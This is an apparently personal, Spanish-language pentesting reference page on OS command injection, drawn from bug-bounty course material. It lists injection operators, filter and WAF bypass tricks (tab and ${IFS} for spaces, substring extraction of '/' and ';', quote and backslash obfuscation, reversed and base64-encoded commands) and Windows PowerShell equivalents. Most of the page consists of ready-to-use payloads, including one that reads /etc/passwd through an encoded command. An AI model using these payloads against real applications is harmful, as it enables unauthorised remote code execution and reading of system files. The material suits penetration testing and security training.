---
title: OS Command Injection (operadores + filter/WAF bypass)
slug: command-injection
category: techniques
updated: 2026-08-20
summary: "Inyección de comandos: operadores (;/&&/||/%0a), bypass de espacios (%09/${IFS}/{cmd,arg}), de chars (${PATH:0:1}/char-shift), de comandos (quotes/w\\ho\\ami/rev/base64<<<), evasión de WAF"
tags: [web, command-injection, rce, waf-bypass, filter-bypass, linux, windows]
sensitive: false
---

# OS Command Injection

## When to use
Un parámetro cuyo valor la app pasa a un comando del SO (ping, nslookup,
convert, zip…). Objetivo: inyectar un 2º comando → RCE. Ver hub [[web-app-attacks]].

## Operadores de inyección
| Operador | Comportamiento |
|---|---|
| `;` | Ejecuta ambos (no en Windows CMD) |
| `\n` (`%0a`) | Nueva línea = separador; **rara vez blacklisteado** (útil como operador) |
| `&&` | 2º solo si el 1º tiene éxito (exit 0) |
| `\|\|` | 2º solo si el 1º **falla** → útil rompiendo el 1º: `\|\| whoami` |
| `&` / `\|` | background / pipe |
```bash
127.0.0.1; whoami
127.0.0.1%0a whoami        # newline suele saltar blacklists de ; && ||
|| whoami                  # rompe el ping → ejecuta limpio solo el 2º
```
Validación solo en front-end (sin request nueva en DevTools Network) → bypass mandando la request directo al back-end (Burp Repeater, URL-encode payload con Ctrl+U).

## Bypass de espacios (blacklist)
```bash
127.0.0.1%0a%09              # tab (%09) en vez de espacio
127.0.0.1%0a${IFS}          # $IFS = space+tab por defecto
127.0.0.1%0a{ls,-la}        # brace expansion: coma → espacio
```

## Bypass de otros chars (/ \ ; …)
No hay env var directa para `/`, pero se extrae por substring de una existente:
```bash
echo ${PATH:0:1}            # → /   (start 0, len 1)
echo ${LS_COLORS:10:1}      # → ;   (buscar con printenv)
# Windows CMD:  echo %HOMEPATH:~6,-11%   → \
# PowerShell:   $env:HOMEPATH[0]         → \
# Char shifting (Linux, char anterior en ASCII, man ascii):
echo $(tr '!-}' '"-~'<<<[)  # [ (91) → \ (92)
```

## Bypass de comandos (blacklist de palabras)
Blacklist PHP típica hace match exacto de `whoami`/`cat`… → ofuscar rompe el match:
```bash
# Quotes (Linux+Windows; nº par, no mezclar tipos):
w'h'o'am'i      w"h"o"am"i
# Solo Linux (nº impar OK): backslash / $@
w\ho\am\i       who$@ami
# Solo Windows: caret
who^ami
# Case (Windows case-insensitive): WhOaMi
# Case (Linux, forzar minúsculas):
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")      $(a="WhOaMi";printf %s "${a,,}")
# Comando invertido:
echo 'whoami' | rev  → imaohw ;  $(rev<<<'imaohw')
# Windows:  iex "$('imaohw'[-1..-20] -join '')"
```

## Comandos codificados (evade WAF + chars filtrados/url-decode)
```bash
echo -n 'cat /etc/passwd | grep 33' | base64        # Y2F0...zMw==
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)   # <<< evita el pipe filtrado
# Si bash/base64 filtrados: usar sh, openssl (b64), xxd (hex)
# Windows:
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))   # dwBoAG8AYQBtAGkA
# (Linux equiv: echo -n whoami | iconv -f utf-8 -t utf-16le | base64)
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

## Operadores por tipo de inyección (referencia)
SQLi `' , ; -- /* */` · cmd `; && | &` · LDAP `* ( ) & |` · XPath `' or and not` · code `$() ${} #{} %{} ^` · traversal `../ ..\ %00` · header `\n \r\n %0d %0a %09`.

## Gotchas
- Combinar bypasses: una técnica de comando (ej. `tr`) suele reintroducir espacios/`/` filtrados → aplicar también el bypass de esos chars, o parece que "no funciona".
- Siempre probar el payload en una VM propia primero (¿es un comando válido?) antes de culpar al filtro.
- Es RCE contra un sistema en producción → destructivo/persistente solo con OK explícito por-acción.

## References
- Relacionado: [[web-app-attacks]], [[web-app-fundamentals]], [[gtfobins-binaries]], [[reverse-shells]]
- PayloadsAllTheThings/Command Injection. Curso CWES Bug Bounty → 03-WEB → "Command Injections" (HTB Academy). Notion.
